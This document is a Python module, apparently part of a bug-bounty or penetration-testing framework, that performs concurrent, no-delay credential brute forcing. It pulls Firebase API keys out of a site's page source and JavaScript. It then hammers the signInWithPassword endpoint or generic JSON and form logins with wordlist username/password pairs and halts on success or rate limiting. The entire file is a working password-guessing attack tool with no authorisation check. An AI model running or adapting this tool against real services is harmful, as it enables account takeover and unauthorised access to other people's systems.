import asyncio
import sys
from typing import List, Dict, Optional, Tuple, Set
from core.base_module import BaseModule, Finding
from pathlib import Path
import json
import urllib.request
import urllib.error
import urllib.parse
import base64
import re


class CredentialTester(BaseModule):
    """Test for brute force vulnerabilities - CONCURRENT NO-DELAY VERSION"""

    def __init__(self, config, stealth=None, db=None, graph_manager=None):
        super().__init__(config, stealth, db, graph_manager)
        self.max_attempts    = config.get('max_attempts', 1000)
        self.delay           = 0
        self.wordlist_path   = config.get('wordlist_path', 'wordlists')
        self.concurrency     = config.get('concurrency', 50)
        self.custom_userlist  = config.get('userlist', None)
        self.custom_passlist  = config.get('passlist', None)
        self._max_usernames   = config.get('max_usernames', 200)
        self._max_passwords   = config.get('max_passwords', 2000)

    def _print_progress(self, current: int, total: int, prefix: str = 'Progress', width: int = 40):
        if total == 0:
            return
        pct   = current / total
        filled = int(width * pct)
        bar   = '█' * filled + '░' * (width - filled)
        line  = f'\r\033[96m{prefix}:\033[0m [{bar}] \033[93m{pct*100:5.1f}%\033[0m  {current}/{total}'
        sys.stdout.write(line)
        sys.stdout.flush()
        if current >= total:
            sys.stdout.write('\n')
            sys.stdout.flush()

    async def run(self, target: str, **kwargs) -> List[Finding]:
        if not kwargs.get('enable_brute_force', False):
            return self.findings

        if kwargs.get('userlist'):      self.custom_userlist = kwargs['userlist']
        if kwargs.get('passlist'):      self.custom_passlist = kwargs['passlist']
        if kwargs.get('max_usernames'): self._max_usernames  = kwargs['max_usernames']
        if kwargs.get('max_passwords'): self._max_passwords  = kwargs['max_passwords']

        target_url = target if target.startswith(('http://', 'https://')) else f"https://{target}"

        print(f"\033[96m[*] Target URL: {target_url}\033[0m")

        if 'identitytoolkit.googleapis.com' in target_url:
            print(f"\033[92m[+] Using Firebase Identity Toolkit URL directly\033[0m")
            endpoint = {
                'url': target_url,
                'form_type': 'firebase',
                'fields': {
                    'username_fields': ['email'],
                    'password_field': 'password'
                }
            }
        else:
            print(f"\033[96m[*] Attempting to extract Firebase config...\033[0m")
            firebase_url = await self._extract_firebase_endpoint(target_url)
            
            if firebase_url:
                print(f"\033[92m[+] Firebase endpoint found: {firebase_url}\033[0m")
                endpoint = {
                    'url': firebase_url,
                    'form_type': 'firebase',
                    'fields': {
                        'username_fields': ['email'],
                        'password_field': 'password'
                    }
                }
            else:
                print(f"\033[93m[!] Could not extract Firebase config, trying direct brute force\033[0m")
                endpoint = {
                    'url': target_url,
                    'form_type': 'auto',
                    'fields': {
                        'username_fields': ['email', 'username', 'user', 'login'],
                        'password_field': 'password'
                    }
                }

        ulist_label = self.custom_userlist or f"{self.wordlist_path}/usernames.txt"
        plist_label = self.custom_passlist or f"{self.wordlist_path}/passwords.txt"
        print(f"\033[96m[*] Userlist : {ulist_label}\033[0m")
        print(f"\033[96m[*] Passlist : {plist_label}\033[0m\n")

        await self._test_brute_force(endpoint)
        return self.findings

    async def _extract_firebase_endpoint(self, url: str) -> Optional[str]:
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=15) as response:
                html = response.read().decode('utf-8', errors='ignore')
            
            api_key = None
            
            patterns = [
                r'apiKey["\'\s]*[:=]["\'\s]*([A-Za-z0-9_-]{39})',
                r'apiKey:\s*["\']([A-Za-z0-9_-]{39})["\']',
                r'"apiKey":\s*"([A-Za-z0-9_-]{39})"',
                r'apiKey\s*=\s*["\']([A-Za-z0-9_-]{39})["\']',
                r'AIza[0-9A-Za-z_-]{35}',
            ]
            
            for pattern in patterns:
                match = re.search(pattern, html)
                if match:
                    api_key = match.group(1) if match.groups() else match.group(0)
                    print(f"\033[92m[+] Found API key in page source\033[0m")
                    break
            
            if not api_key:
                js_files = re.findall(r'src=["\']([^"\']+\.js)["\']', html)
                print(f"\033[96m[*] Scanning {len(js_files)} JS files for API key...\033[0m")
                
                for js_path in js_files[:10]:
                    try:
                        js_url = js_path if js_path.startswith('http') else urllib.parse.urljoin(url, js_path)
                        js_req = urllib.request.Request(js_url, headers={'User-Agent': 'Mozilla/5.0'})
                        with urllib.request.urlopen(js_req, timeout=10) as js_response:
                            js_content = js_response.read().decode('utf-8', errors='ignore')
                        
                        for pattern in patterns:
                            match = re.search(pattern, js_content)
                            if match:
                                api_key = match.group(1) if match.groups() else match.group(0)
                                print(f"\033[92m[+] Found API key in {js_path}\033[0m")
                                break
                        
                        if api_key:
                            break
                    except Exception:
                        continue
            
            if api_key:
                firebase_url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={api_key}"
                return firebase_url
            
            return None
            
        except Exception as e:
            self.logger.debug(f"Failed to extract Firebase config: {e}")
            return None

    def _load_wordlists(self) -> Tuple[List[str], List[str]]:
        usernames: List[str] = []
        passwords: List[str] = []

        MAX_U = getattr(self, '_max_usernames', 200)
        MAX_P = getattr(self, '_max_passwords', 2000)

        def _load_capped(path, label, cap):
            lines = []
            with open(path, 'r', errors='ignore') as fh:
                for line in fh:
                    s = line.strip()
                    if s:
                        lines.append(s)
                    if len(lines) >= cap:
                        break
            flag = f' \033[91m(capped)\033[0m' if len(lines) == cap else ''
            print(f"\033[92m[+] {label}: {path} ({len(lines)} entries{flag})\033[0m")
            return lines

        import os
        cwd = Path(os.getcwd())

        def _resolve(raw_path: str) -> Optional[Path]:
            candidates = [
                Path(raw_path),
                cwd / raw_path,
                Path(raw_path).expanduser(),
            ]
            for c in candidates:
                try:
                    if c.exists():
                        return c.resolve()
                except Exception:
                    pass
            return None

        if self.custom_userlist:
            upath = _resolve(self.custom_userlist)
            if upath:
                usernames = _load_capped(upath, 'Custom userlist', MAX_U)
            else:
                print(f"\033[91m[!] Userlist not found: '{self.custom_userlist}'\033[0m")

        if not usernames:
            upath = _resolve(str(Path(self.wordlist_path) / 'usernames.txt'))
            if upath:
                usernames = _load_capped(upath, 'Userlist (default)', MAX_U)
            else:
                usernames = ['admin', 'administrator', 'user', 'test', 'root', 'admin@email.com']
                print(f"\033[93m[!] No userlist found — using {len(usernames)} built-in defaults\033[0m")

        if self.custom_passlist:
            ppath = _resolve(self.custom_passlist)
            if ppath:
                passwords = _load_capped(ppath, 'Custom passlist', MAX_P)
            else:
                print(f"\033[91m[!] Passlist not found: '{self.custom_passlist}'\033[0m")

        if not passwords:
            ppath = _resolve(str(Path(self.wordlist_path) / 'passwords.txt'))
            if ppath:
                passwords = _load_capped(ppath, 'Passlist (default)', MAX_P)
            else:
                passwords = ['admin', 'password', '123456', 'login', 'admin123']
                print(f"\033[93m[!] No passlist found — using {len(passwords)} built-in defaults\033[0m")

        print()
        return usernames, passwords

    async def _test_brute_force(self, endpoint: Dict):
        import itertools

        url = endpoint['url']
        form_type = endpoint.get('form_type', 'auto')
        fields = endpoint.get('fields', {})
        
        base_usernames, passwords = self._load_wordlists()
        all_usernames = list(dict.fromkeys(base_usernames))
        total_attempts = len(all_usernames) * len(passwords)

        semaphore = asyncio.Semaphore(self.concurrency)
        found_event = asyncio.Event()
        rate_limited = [False]
        counter = [0]

        print(f"\033[96m[*] Form Type : {form_type}\033[0m")
        print(f"\033[96m[*] Usernames : {len(all_usernames)}\033[0m")
        print(f"\033[96m[*] Passwords : {len(passwords)}\033[0m")
        print(f"\033[96m[*] Total     : {total_attempts}\033[0m\n")

        async def attempt(username: str, password: str):
            if found_event.is_set():
                return
            async with semaphore:
                if found_event.is_set():
                    return
                try:
                    loop = asyncio.get_event_loop()

                    def do_request():
                        if form_type == 'firebase' or 'identitytoolkit' in url:
                            body = json.dumps({
                                'email': username,
                                'password': password,
                                'returnSecureToken': True
                            }).encode('utf-8')
                            req = urllib.request.Request(
                                url,
                                data=body,
                                headers={
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0'
                                },
                                method='POST'
                            )
                            try:
                                with urllib.request.urlopen(req, timeout=15) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'firebase'
                            except urllib.error.HTTPError as e:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'firebase'
                            except Exception as e:
                                return 0, str(e), {}, 'firebase'
                        
                        else:
                            try:
                                body = json.dumps({
                                    'email': username,
                                    'password': password
                                }).encode('utf-8')
                                req = urllib.request.Request(
                                    url,
                                    data=body,
                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
                                    method='POST'
                                )
                                with urllib.request.urlopen(req, timeout=10) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_email'
                            except urllib.error.HTTPError as e:
                                if e.code not in [400, 401, 403]:
                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_email'
                            except Exception:
                                pass

                            try:
                                body = json.dumps({
                                    'username': username,
                                    'password': password
                                }).encode('utf-8')
                                req = urllib.request.Request(
                                    url,
                                    data=body,
                                    headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
                                    method='POST'
                                )
                                with urllib.request.urlopen(req, timeout=10) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'json_user'
                            except urllib.error.HTTPError as e:
                                if e.code not in [400, 401, 403]:
                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'json_user'
                            except Exception:
                                pass

                            try:
                                data = urllib.parse.urlencode({
                                    'email': username,
                                    'password': password
                                }).encode('utf-8')
                                req = urllib.request.Request(
                                    url,
                                    data=data,
                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
                                    method='POST'
                                )
                                with urllib.request.urlopen(req, timeout=10) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_email'
                            except urllib.error.HTTPError as e:
                                if e.code not in [400, 401, 403]:
                                    return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_email'
                            except Exception:
                                pass

                            try:
                                data = urllib.parse.urlencode({
                                    'username': username,
                                    'password': password
                                }).encode('utf-8')
                                req = urllib.request.Request(
                                    url,
                                    data=data,
                                    headers={'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
                                    method='POST'
                                )
                                with urllib.request.urlopen(req, timeout=10) as r:
                                    return r.status, r.read().decode('utf-8', errors='ignore'), dict(r.headers), 'form_user'
                            except urllib.error.HTTPError as e:
                                return e.code, e.read().decode('utf-8', errors='ignore'), dict(e.headers), 'form_user'
                            except Exception as e:
                                return 0, str(e), {}, 'unknown'

                    status, text, resp_headers, used_format = await loop.run_in_executor(None, do_request)
                    tl = text.lower()

                    counter[0] += 1
                    self._print_progress(counter[0], total_attempts,
                                         prefix=f'  \033[96m{username[:22]:<22}\033[0m')

                    if counter[0] == 1:
                        sys.stdout.write('\n')
                        print(f"\033[90m[debug] HTTP {status} | Format: {used_format} | {text[:300]}\033[0m\n")

                    if status == 429:
                        rate_limited[0] = True
                        found_event.set()
                        return

                    is_success = False

                    if used_format == 'firebase':
                        if 'idtoken' in tl or 'id_token' in tl:
                            if not any(err in tl for err in ['invalid', 'error', 'failed']):
                                is_success = True
                        elif 'registered' in tl and 'true' in tl:
                            is_success = True
                    
                    elif any(k in tl for k in ['token', 'access_token', 'session', 'success']):
                        if not any(err in tl for err in ['invalid', 'error', 'failed', 'wrong', 'denied']):
                            is_success = True
                    
                    if status in [301, 302, 303]:
                        location = resp_headers.get('Location', '').lower()
                        if location and not any(p in location for p in ['login', 'error', 'fail']):
                            is_success = True

                    if is_success:
                        sys.stdout.write('\n')
                        self._report_success(username, password, url, counter[0],
                                             [used_format], 'password')
                        found_event.set()

                except asyncio.CancelledError:
                    raise
                except Exception:
                    counter[0] += 1

        tasks = [asyncio.create_task(attempt(u, p))
                 for u, p in itertools.product(all_usernames, passwords)]
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except (KeyboardInterrupt, asyncio.CancelledError):
            for t in tasks: t.cancel()
            sys.stdout.write('\n')
            print(f"\033[93m[!] Interrupted after {counter[0]} attempts\033[0m")
            return

        sys.stdout.write('\n')
        if rate_limited[0]:
            self._add_rate_limit_finding(url, counter[0])
        elif not found_event.is_set():
            print(f"\033[93m[-] No credentials found after {counter[0]} attempts\033[0m")

    def _report_success(self, username, password, url, attempts, username_fields, password_field):
        sep = "=" * 60
        print(f"\n\033[91m{sep}\033[0m")
        print(f"\033[92m[!!!] CREDENTIALS FOUND!\033[0m")
        print(f"\033[92m      Username : {username}\033[0m")
        print(f"\033[92m      Password : {password}\033[0m")
        print(f"\033[92m      URL      : {url}\033[0m")
        print(f"\033[92m      Attempts : {attempts}\033[0m")
        print(f"\033[91m{sep}\033[0m\n")
        self.add_finding(Finding(
            module='brute_force',
            title=f'[CREDENTIALS FOUND] {username}:{password} @ {url}',
            severity='Critical',
            description=f'Successfully brute-forced login at {url}\nUsername: {username}\nPassword: {password}\nAttempts: {attempts}',
            evidence={'username': username, 'password': password, 'url': url, 'attempts': attempts},
            poc=f"curl -X POST '{url}' -d 'email={username}&password={password}'",
            remediation='Implement strong password policy, rate limiting, and account lockout',
            cvss_score=9.8, bounty_score=5000, target=url))

    def _add_rate_limit_finding(self, url, attempts):
        self.add_finding(Finding(
            module='brute_force', title='Rate Limiting Detected During Brute Force',
            severity='Info',
            description=f'Rate limiting triggered after {attempts} attempts',
            evidence={'attempts': attempts, 'url': url},
            poc=f"Send {attempts} login requests to {url}",
            remediation='Rate limiting is working correctly',
            cvss_score=0.0, bounty_score=0, target=url))
